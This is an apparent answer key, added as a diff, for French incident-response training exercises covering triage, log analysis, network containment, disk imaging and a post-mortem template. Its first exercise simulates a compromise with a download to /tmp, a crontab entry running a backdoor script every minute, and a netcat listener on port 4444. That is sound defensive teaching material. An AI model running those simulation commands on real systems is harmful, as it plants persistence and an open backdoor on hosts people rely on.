@@ -1,0 +1,107 @@
+---
+title: Corrigé — Réponse à incident
+---
+
+# Corrigé — Réponse à incident
+
+## Exercice 1 — Triage
+
+```bash
+# Simulation de l'incident
+wget -q http://example.com -O /tmp/suspicious_file 2>/dev/null
+echo "* * * * * /tmp/backdoor.sh" | crontab -
+nc -lvnp 4444 &
+
+# Début du triage (en tant que root)
+DATE=$(date +%Y%m%d_%H%M%S)
+OUT=/tmp/triage_$DATE
+mkdir -p $OUT
+
+ps auxef > $OUT/ps.txt
+ss -tnap > $OUT/connections.txt
+who > $OUT/users.txt && last -10 >> $OUT/users.txt
+find /tmp /var/tmp -newer /var/log/syslog -type f 2>/dev/null > $OUT/recent_tmp.txt
+
+# Crontabs
+for user in $(cut -d: -f1 /etc/passwd); do
+  crontab -l -u $user 2>/dev/null && echo "--- $user ---" || true
+done > $OUT/crontabs.txt
+
+# Bundle signé
+tar czf /tmp/triage_$DATE.tar.gz -C /tmp triage_$DATE/
+sha256sum /tmp/triage_$DATE.tar.gz > /tmp/triage_$DATE.sha256
+cat /tmp/triage_$DATE.sha256
+```
+
+## Exercice 2 — Analyse logs
+
+```bash
+# Première connexion suspecte
+grep 'Accepted\|Failed' /var/log/auth.log | \
+  awk '{print $1,$2,$3,$9,$11}' | head -20
+
+# Via auditd
+ausearch -ts today -k user-exec 2>/dev/null | \
+  grep 'execve' | awk -F'comm="' '{print $2}' | cut -d'"' -f1 | \
+  sort | uniq -c | sort -rn | head -20
+```
+
+## Exercice 3 — Confinement
+
+```bash
+# Isolation réseau sans reboot
+iptables -I INPUT -i lo -j ACCEPT
+iptables -I OUTPUT -o lo -j ACCEPT
+iptables -P INPUT DROP
+iptables -P OUTPUT DROP
+iptables -P FORWARD DROP
+
+# Garder SSH de gestion
+iptables -I INPUT -s 10.10.0.1 -p tcp --dport 22 -j ACCEPT
+iptables -I OUTPUT -d 10.10.0.1 -p tcp --sport 22 -j ACCEPT
+
+# Snapshot disque
+dd if=/dev/sda of=/mnt/evidence/disk.img bs=4M status=progress conv=sync,noerror
+
+# Vérification intégrité
+sha256sum /dev/sda > /tmp/source.sha256
+sha256sum /mnt/evidence/disk.img > /tmp/snapshot.sha256
+diff <(awk '{print $1}' /tmp/source.sha256) <(awk '{print $1}' /tmp/snapshot.sha256) && \
+  echo "Snapshot intègre" || echo "ATTENTION: snapshot différent !"
+```
+
+## Exercice 4 — Post-mortem template
+
+```markdown
+# Rapport d'Incident — [DATE]
+
+## Résumé exécutif
+[3 phrases]
+
+## Timeline
+| Heure | Événement |
+|---|---|
+| 14:23 | Connexion SSH depuis 203.0.113.42 |
+| 14:25 | Téléchargement de /tmp/suspicious_file |
+| 14:26 | Ajout crontab malveillant |
+| 14:30 | Backdoor netcat sur port 4444 |
+
+## Vecteur d'attaque
+Brute-force SSH → accès stagiaire01 → escalade privilege
+
+## Indicateurs de Compromission (IoC)
+- IP : 203.0.113.42
+- Fichier : /tmp/suspicious_file
+- Crontab : * * * * * /tmp/backdoor.sh
+- Port : 4444
+
+## Remédiations
+1. Rotation de tous les credentials SSH
+2. Activation fail2ban (3 tentatives max)
+3. Restriction sudo (NOPASSWD supprimé)
+
+## Améliorations surveillance
+- Alertes ouverture de ports inhabituels
+- Monitoring modifications crontab (auditd)
+- SIEM pour corrélation des événements
+```
